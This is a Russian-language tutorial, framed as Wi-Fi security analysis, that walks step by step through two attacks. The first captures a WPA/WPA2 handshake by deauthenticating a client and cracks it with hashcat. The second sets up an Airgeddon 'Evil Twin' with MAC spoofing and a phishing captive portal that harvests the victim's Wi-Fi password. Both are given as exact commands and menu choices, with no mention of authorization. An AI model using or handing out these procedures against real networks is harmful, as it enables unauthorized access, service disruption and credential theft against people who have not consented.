# Практическое руководство по анализу безопасности Wi-Fi сетей

## Часть 1. Атака на WPA/WPA2 с перехватом рукопожатия

Этот метод заключается в перехвате WPA/WPA2 "handshake" и последующем подборе пароля в офлайн-режиме с помощью словаря.

### Требования
*   Дистрибутив Kali Linux (или другой Linux с установленным набором Aircrack-ng).
*   Wi-Fi адаптер с поддержкой режима монитора и инъекции пакетов.

### Шаг 1: Подготовка
1.  Обновите пакеты:
    ```bash
    sudo apt update && sudo apt upgrade -y
    ```
2.  Определите имя вашего Wi-Fi адаптера:
    ```bash
    iwconfig
    # или
    ip a
    ```
    Обычно это `wlan0`.

### Шаг 2: Перевод в режим монитора
Переведите адаптер в режим монитора, чтобы он мог перехватывать весь трафик. Замените `wlan0` на имя вашего адаптера.
```bash
sudo airmon-ng start wlan0
```
После выполнения команды имя интерфейса скорее всего изменится на `wlan0mon`. Проверьте это командой `iwconfig`.

### Шаг 3: Сканирование сетей
Запустите сканирование для поиска цели.
```bash
sudo airodump-ng wlan0mon
```
Вы увидите список всех Wi-Fi сетей в радиусе действия. Выберите вашу цель и запишите её `BSSID` (MAC-адрес точки доступа) и `CH` (канал). Нажмите `Ctrl+C` для остановки.

### Шаг 4: Целевой перехват трафика
Теперь запустите `airodump-ng` для прослушивания только целевой сети, указав ее BSSID и канал. Флаг `-w` указывает имя файла для сохранения перехваченного рукопожатия.
```bash
# Замените <BSSID> и <канал> на ваши значения
sudo airodump-ng --bssid <BSSID> --channel <канал> -w capture wlan0mon
```
В окне вы увидите точку доступа и подключенных к ней клиентов (`STATION`).

### Шаг 5: Деаутентификация клиента для захвата рукопожатия
Откройте новый терминал. Чтобы ускорить процесс, можно принудительно отключить клиента от сети. Он автоматически начнет переподключаться, и в этот момент мы перехватим рукопожатие.
*   `-0 5`: отправить 5 пакетов деаутентификации.
*   `-a <BSSID>`: MAC-адрес точки доступа.
*   `-c <Client MAC>`: MAC-адрес клиента, которого отключаем (возьмите из окна `airodump-ng`).
```bash
# Замените <BSSID> и <Client MAC>
sudo aireplay-ng -0 5 -a <BSSID> -c <Client MAC> wlan0mon
```
Вернитесь в окно `airodump-ng`. Если все прошло успешно, в правом верхнем углу вы увидите сообщение `[ WPA handshake: <BSSID> ]`. Это означает, что рукопожатие перехвачено. Теперь можно остановить обе команды (`Ctrl+C`).

### Шаг 6: Подбор пароля с помощью Hashcat
В текущей директории появятся файлы, начинающиеся с `capture`. Нас интересует файл с расширением `.cap`.

1.  **Конвертация `.cap` в формат Hashcat (`.hc22000`)**:
    Установите `hcxtools`:
    ```bash
    sudo apt install hcxtools
    ```
    Конвертируйте:
    ```bash
    hcxpcapngtool -o hash.hc22000 capture-01.cap
    ```
2.  **Запуск брутфорса по словарю**:
    *   `-m 22000`: режим для WPA-PBKDF2-PMKID+EAPOL (WPA/WPA2).
    *   `hash.hc22000`: файл с хешем.
    *   `/usr/share/wordlists/rockyou.txt`: путь к словарю. Можно использовать любой другой.
    ```bash
    hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
    ```
Если пароль есть в словаре, Hashcat его найдет и покажет.

## Часть 2. Атака "Злой двойник" (Evil Twin) с помощью Airgeddon

Этот метод создает фейковую точку доступа и фишинговую страницу для получения пароля от пользователя напрямую.

### Шаг 1: Установка и запуск Airgeddon
```bash
sudo apt install airgeddon
sudo airgeddon
```

### Шаг 2: Первичная настройка
1.  Инструмент проверит наличие необходимых зависимостей. Если что-то отсутствует, установите.
2.  Нажмите `Enter`.
3.  Выберите ваш Wi-Fi адаптер (например, `wlan0`).
4.  Переведите его в режим монитора (пункт `2` в меню).

### Шаг 3: Выбор и настройка атаки
1.  Вернитесь в главное меню и выберите `Evil Twin attacks menu` (обычно пункт `7`).
2.  Выберите `Evil Twin attack with captive portal` (пункт `9`).
3.  Запустится сканирование. После обнаружения цели остановите его (`Ctrl+C`).
4.  Выберите целевую сеть из списка по номеру.
5.  **Настройка атаки**:
    *   **Deauth attack**: `Да`. Это будет отключать жертву от настоящей сети.
    *   **Handshake capture**: `Нет`. Для этой атаки он не нужен.
    *   **MAC Spoofing**: `Да`. Чтобы ваша фейковая точка выглядела убедительнее.
    *   **Captive Portal Language**: Выберите язык для фишинговой страницы (например, `Russian`).

### Шаг 4: Запуск атаки
1.  Airgeddon предупредит, что откроет несколько окон терминала. Согласитесь.
2.  Откроются окна, каждое из которых выполняет свою роль:
    *   **Deauth:** отключает клиентов.
    *   **AP:** управляет фейковой точкой доступа.
    *   **DHCP:** выдает IP-адреса подключившимся.
    *   **DNS:** перенаправляет все запросы на фишинговую страницу.
    *   **Captive Portal:** веб-сервер с самой фишинговой страницей.

### Шаг 5: Получение пароля
1.  Жертва отключается от своей сети.
2.  Она видит две сети с одинаковым именем и подключается к вашей (или ее устройство делает это автоматически).
3.  При попытке выйти в интернет браузер перенаправляет ее на страницу с просьбой ввести пароль от Wi-Fi.
4.  Как только жертва введет пароль, он отобразится в одном из окон Airgeddon.
5.  Чтобы корректно остановить атаку, вернитесь в главное окно Airgeddon (то, из которого вы ее запускали) и нажмите `Enter`.
